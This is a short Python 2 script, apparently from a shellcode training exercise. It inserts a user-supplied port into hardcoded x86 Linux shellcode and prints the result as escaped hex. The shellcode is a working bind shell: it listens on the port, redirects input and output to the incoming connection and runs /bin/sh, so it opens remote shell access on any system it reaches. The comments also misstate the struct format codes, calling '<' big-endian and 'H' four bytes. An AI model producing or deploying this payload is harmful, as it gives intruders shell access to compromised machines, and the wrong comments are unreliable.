#!/usr/bin/python

import argparse
import struct 

#https://docs.python.org/2/howto/argparse.html

parser = argparse.ArgumentParser()
# parser .add_argument("-a", help="IP Address", type=str)
parser .add_argument('-p', help="Port", type=int)

args = parser.parse_args()

port = args.p

#In order to change the port number provided into packed binary we can use the struct module
#https://docs.python.org/2/library/struct.html
#####
# struct pack args
#####
# Byte Order, Size, Alignment: 
# < = big-endian
## Format Characters:
# H = unsigned short / integer / 4
#####

shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x56\x56\x66\x68" + struct.pack(">H", port) + "\x66\x6a\x02\x89\xe1\x6a\x66\x58\x6a\x02\x5b\x6a\x10\x51\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x04\x5b\x56\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x05\x5b\x31\xf6\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"


print 'shellcode:\n' + ''.join('\\x%02x' % ord(c) for c in shellcode)
#print 'shellcode:\n' + ''.join(hex(ord(c)) for c in shellcode)



#https://docs.python.org/3/library/os.html#os.system




